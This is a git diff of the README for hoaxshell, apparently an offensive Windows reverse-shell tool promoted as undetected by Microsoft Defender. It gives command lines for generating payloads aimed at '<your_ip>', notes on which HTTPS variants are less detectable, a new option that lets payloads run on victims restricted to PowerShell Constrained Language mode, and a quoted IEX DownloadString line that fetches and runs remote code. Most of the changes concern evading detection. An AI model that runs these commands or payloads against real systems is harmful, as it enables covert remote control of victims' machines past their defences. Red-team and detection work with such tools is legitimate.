@@ -12,7 +12,7 @@ hoaxshell is an unconventional Windows reverse shell, currently undetected by Mi
 
 ### Video Presentations  
 [2022-10-11] Recent & awesome, made by @JohnHammond -> [youtube.com/watch?v=fgSARG82TJY](https://www.youtube.com/watch?v=fgSARG82TJY)  
-[2022-07-15] Original release demo made by me -> [youtube.com/watch?v=SEufgD5UxdU](https://www.youtube.com/watch?v=SEufgD5UxdU)
+[2022-07-15] Original release demo, made by me -> [youtube.com/watch?v=SEufgD5UxdU](https://www.youtube.com/watch?v=SEufgD5UxdU)
 
 ## Screenshots
 ![usage_example_png](https://raw.github.com/t3l3machus/hoaxshell/master/screenshots/hoaxshell-win11-v2.png)
@@ -51,7 +51,8 @@ sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
 sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
 ```
 
-### Encrypted shell session (https)
+### Encrypted shell session (https + self-signed certificate)
+This particular payload is kind of a red flag, as it begins with an additional block of code that instructs PowerShell to skip SSL certificate checks, which makes it suspicious and easy to detect as well as significantly longer in length. Not recommended.
 ```
 # Generate self-signed certificate:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
@@ -60,7 +61,6 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
 sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
 
 ```  
-The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.
 
 ### Encrypted shell session with a trusted certificate
 If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem).
@@ -74,6 +74,15 @@ In case you close your terminal accidentally, have a power outage or something, 
 sudo python3 hoaxshell.py -s <your_ip> -g
 ```  
 **Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).
+
+### Constraint language mode support
+Use any of the payload variations with the `-cm` (--constraint-mode) option to generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.
+
+```
+sudo python3 hoaxshell.py -s <your_ip> -cm
+```  
+![image](https://user-images.githubusercontent.com/75489922/195611068-cc9230ee-8f60-454c-baca-7680fd5ee80a.png)
+
 
 ### Shell session over https using tunneling tools ([Ngrok](https://ngrok.com) / [LocalTunnel](https://localtunnel.me))
 Utilize tunnelling programmes **Ngrok** or **LocalTunnel** to get sessions through secure tunnels, overcominge issues like not having a Static IP address or your ISP forbidding Port-Forwarding.
@@ -111,11 +120,9 @@ hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:44
 Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.
 
 ## News
+ - `13/10/2022` - Added constraint language mode support (-cm) option.
  - `08/10/2022` - Added the `-ng` and `-lt` options that generate PS payloads for obtaining sessions using tunnelling tools **ngrok** or **localtunnel** in order to get around limitations like Static IP addresses and Port-Forwarding.  
  - `06/09/2022` - A new payload was added that writes the commands to be executed in a file instead of utilizing `Invoke-Expression`. To use this, the user must provide a .ps1 file name (absolute path) on the victim machine using the `-x` option.  
  - `04/09/2022` - Modifications were made to improve the command delivery mechanism as it included components that could be easily flagged. The `-t` option along with the `https_payload_trusted.ps1` were added. You can now use hoaxshell by supplying a domain name along with a trusted certificate. This will generate a shorter and less detectable https payload.  
  - `01/09/2022` - Added the `-H` option which allows users to give a custom name to the (random by default) header utilized in the attack process, carring the shell's session id. This makes the attack less detectable e.g. by using a standard header name e.g. "Authorization".
  - `31/08/2022` - Added the `-i` option that generates the PS payload adjusted to use "Invoke-RestMethod' instead of 'Invoke-WebRequest' utility, so now the user can choose (thanks to this [issue](https://github.com/t3l3machus/hoaxshell/issues/8)). I also fixed a bug that existed in the prompt (it sometimes messed the path).  
-
- 
-
